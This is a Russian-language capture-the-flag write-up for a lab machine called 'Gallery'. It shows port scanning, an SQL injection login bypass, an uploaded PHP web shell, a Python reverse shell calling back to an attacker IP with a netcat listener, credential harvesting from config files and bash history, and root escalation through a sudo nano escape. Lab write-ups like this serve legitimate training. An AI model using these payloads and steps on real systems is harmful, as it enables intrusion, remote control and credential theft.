# Writeup: Gallery

> Our gallery is not very well secured.  

Для начала соберем информацию о цели, начнем со сканирования портов с помощью nmap:
```sh
nmap -sS -sV -p- 10.114.181.82
```
```sh
Starting Nmap 7.991SVN ( https://nmap.org )
Nmap scan report for 10.114.181.82
Host is up (0.0041s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
8080/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.32 seconds
```
Доступно три порта:
- 22 -ssh
- 80 - http
- 8080 - http  

Сканнер директорий обнаружил следующие ресурсы:
```sh
http://10.114.181.82/gallery 200
http://10.114.181.82/gallery/assets 200
http://10.114.181.82/gallery/build 200
http://10.114.181.82/gallery/classes 200
http://10.114.181.82/gallery/database 200
http://10.114.181.82/gallery/dist 200
http://10.114.181.82/gallery/inc 200
http://10.114.181.82/gallery/index.php 200
http://10.114.181.82/gallery/plugins 200
http://10.114.181.82/gallery/uploads 200
http://10.114.181.82/index.html 200

http://10.114.181.82/gallery/albums 500
http://10.114.181.82/gallery/user 500
http://10.114.181.82/gallery/schedules 500
http://10.114.181.82/gallery/archives 500
http://10.114.181.82/gallery/home.php 500
http://10.114.181.82/gallery/report 500
```
При более глубоком изучение пополняется копилка находок:  
```sh
http://10.114.181.82/gallery/classes/SystemSettings.php?f=update_settings
```
Возвращает значение *1*  

Форма аутентификации при отправке данных возвращает sql запрос в ответе:
```sh
curl -d "username=admin&password=test" 'http://10.114.181.82/gallery/classes/Login.php?f=login'
```
```sh
{"status":"incorrect","last_qry":"SELECT * from users where username = 'admin' and password = md5('test') "}
```

Форма уязвима к SQLi, payload, который я ввел и авторизовался в админ панели:
```sh
username=admin' OR '
```

На странице *gallery/?page=user* можно загрузить изображение аватара. Стоит попробовать загрузить php скрипт и проверить результат. Вот такой скрипт подготовим и загрузим:
```php
<?php system($_GET['command']) ?>
```
Приложение не проверяет загружаемый файлы, что позволило успешно загрузить скрипт и теперь его можно уведить в директории загрузок */gallery/uploads*. PoC его работы: 
```sh
http://10.113.158.186/gallery/uploads/1794906360_shell.php?command=ls
```
```sh
1794906360_shell.php gallery.png no-image-available.png user_1 
```
В директории */home/* обнаружено три директории:
- mike
- ssm-user
- ubuntu  

Нам явно удобнее было бы работать через терминал, сделаем бек коннект:  
На подконтрольной машине
```sh
nc -lvnp 4444
```
В браузере
```sh
http://10.113.158.186/gallery/uploads/1794906900_shell.php?command=python3%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22192.168.160.249%22,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([%22/bin/bash%22,%22-i%22])%27
```
Для удобства получим оболочку bash
```sh
python3 -c 'import pty;pty.spawn("/bin/bash")'
```
В файле инициализации веб-приложение были обнаружены доступы к БД:
```sh
if(!defined('DB_SERVER')) define('DB_SERVER',"localhost");
if(!defined('DB_USERNAME')) define('DB_USERNAME',"gallery_user");
if(!defined('DB_PASSWORD')) define('DB_PASSWORD',"passw0rd321");
if(!defined('DB_NAME')) define('DB_NAME',"gallery_db");
```
Это позволило нам подключиться к базе данных MariaDB и забрать хеш пароля admin.  

Далее нам нужно получить флаг mike. Для автоматизации сбора данных был использан скрипт LinPEAS *https://github.com/nagaxor/linPEAS/blob/main/LinPEAS.sh*  
С его помощью ускорился поис бэкапов файлов пользователей, которые мог читать *www-data*. 
```sh
cat /var/backups/mike_home_backup/.bash_history
```
```sh
cd ~
ls
ping 1.1.1.1
cat /home/mike/user.txt
cd /var/www/
ls
cd html
ls -al
cat index.html
sudo -lb3stpassw0rdbr0xx
clear
sudo -l
exit
```
Из истории bash можно заметить попытку ввода пароля. Таким образом мы получили логин и пароль пользователя mike и смогли прочитать файл user.txt
```sh
# login: mike
# password: b3stpassw0rdbr0xx
ssh mike@10.114.185.47
```
```sh
cat ~/user.txt
```

Осталось повысить привелегии до root и захватить его флаг. Первым делом проверим, может ди mike что-то выполнять от root:
```sh
mike@ip-10-114-185-47:~$ sudo -l
```
```sh
Matching Defaults entries for mike on ip-10-114-185-47:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User mike may run the following commands on ip-10-114-185-47:
    (root) NOPASSWD: /bin/bash /opt/rootkit.sh
```
Ага, мы можем запустить какой-то rootkit.sh:
```sh
#!/bin/bash

read -e -p "Would you like to versioncheck, update, list or read the report ? " ans;

# Execute your choice
case $ans in
    versioncheck)
        /usr/bin/rkhunter --versioncheck ;;
    update)
        /usr/bin/rkhunter --update;;
    list)
        /usr/bin/rkhunter --list;;
    read)
        /bin/nano /root/report.txt;;
    *)
        exit;;
esac
```
Скрипт может запускать текстовый редактор nano, так как скрипт будет исполнен от sudo, логично предположить, что и nano откроется с теми же правами :)  

Таким образом мы смогли повысить свои привелегии на сервере!

### Используемые инструменты:
- [CyberWarn](https://github.com/rickert155/CyberWarn)
- [LinPEAS.sh](https://github.com/nagaxor/linPEAS)
- netcat
- curl
